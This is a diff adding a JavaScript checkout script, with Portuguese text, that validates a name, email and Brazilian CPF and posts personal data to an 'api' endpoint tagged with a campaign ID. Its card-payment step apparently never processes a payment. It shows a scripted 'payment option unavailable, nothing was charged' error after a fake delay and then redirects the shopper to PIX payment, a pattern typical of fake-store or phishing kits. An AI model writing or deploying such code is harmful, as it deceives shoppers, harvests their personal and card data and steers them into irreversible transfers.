@@ -1,0 +1,126 @@
+function validateEmail(email) { 
+    var re = /\S+@\S+\.\S+/;
+    return re.test(email);
+}
+ 
+
+function validateName(name) { 
+    var regex = /^[a-zA-Z\s]*$/;
+    return regex.test(name.trim());
+}
+
+function validateCPF(cpf) {
+    cpf = cpf.replace(/[^\d]+/g, '');  
+    if (cpf.length !== 11) return false; 
+    var regex = /^(\d)\1{10}$/;
+    if (regex.test(cpf)) return false; 
+    var sum = 0;
+    var remainder;
+    for (var i = 1; i <= 9; i++) {
+        sum += parseInt(cpf.substring(i - 1, i)) * (11 - i);
+    }
+    remainder = (sum * 10) % 11;
+
+    if ((remainder === 10) || (remainder === 11)) remainder = 0;
+    if (remainder !== parseInt(cpf.substring(9, 10))) return false;
+
+    sum = 0;
+    for (var i = 1; i <= 10; i++) {
+        sum += parseInt(cpf.substring(i - 1, i)) * (12 - i);
+    }
+    remainder = (sum * 10) % 11;
+
+    if ((remainder === 10) || (remainder === 11)) remainder = 0;
+    if (remainder !== parseInt(cpf.substring(10, 11))) return false;
+
+    return true;
+}
+function alerta(txt)
+{
+    Swal.fire({
+        title: 'Não foi possivel continuar!',
+        text: txt,
+        icon: 'error',
+        confirmButtonText: 'Entendi'
+    })
+}
+
+async function postDatateste(url = '', data = {}) 
+{ 
+    const options = {
+        method: 'POST',  
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded', 
+        },
+        body: new URLSearchParams(data)  
+    };
+    const response = await fetch(url, options);
+    return response.json();
+}
+async function process ()
+{
+    var email           = $("#email").val();
+    var telephone       = $("#telephone").val();
+    var name            = $("#name").val();
+    var documento        = $("#document").val(); 
+    if ( !name.includes(" ") ) {
+        alerta("Verifique os dados inseridos");
+        return;
+    }
+
+    var splitedname   = name.split(" ");
+    var firstname     = splitedname[0]; 
+    if ( validateEmail (email ) && validateCPF ( documento ) && validateName(firstname) )  
+    {
+		var valor  = "18.90";
+		var data_c = ""+name+"|"+telephone+"|"+documento+"";
+		postDatateste('api?valor='+valor+'&userData=sim', {
+			uid: currentUId,
+			campanha: campanha,
+			dados: data_c
+		})
+		.then(data => 
+		{
+			setTimeout(function() {
+			   location.href = "endereço";
+		   },1500);
+		}); 
+    } else {
+        alerta("Verifique os dados inseridos");
+    }
+} 
+function changeMethod ( method ) {
+    location.href = "pagamento-"+method;
+}
+
+function finalizar_step (  )
+{
+    document.querySelector('#loading_ajax_gif').style.display = "";
+    setTimeout( function()  {
+        alerta("A opção de pagamento selecionada não está disponível no momento! \n\n        Nenhum valor foi cobrado em seu cartão.\n\nPara continuar utilize outra de nossas forma(s) de pagamento(s).")
+        document.querySelector('#loading_ajax_gif').style.display = "none";
+        setTimeout ( function () {
+			changeMethod("pix");
+		},1000*15);
+    }, 1000 * 5);
+}
+
+function finalizar (  ) {
+
+    document.querySelector('#loading_ajax_gif').style.display = "";
+
+    setTimeout( function()  
+    {  
+        location.replace("finalizar-compra");
+    }, 1000 * 4);
+}
+
+function toggle_summary() 
+{
+    var currently =  
+    (
+        document.querySelector("#purchase-summary__body").style.display == "none"
+    ) ? false : true;
+    
+    document.querySelector("#purchase-summary__body").style.display =  ( currently ) ? "none" : "";
+}
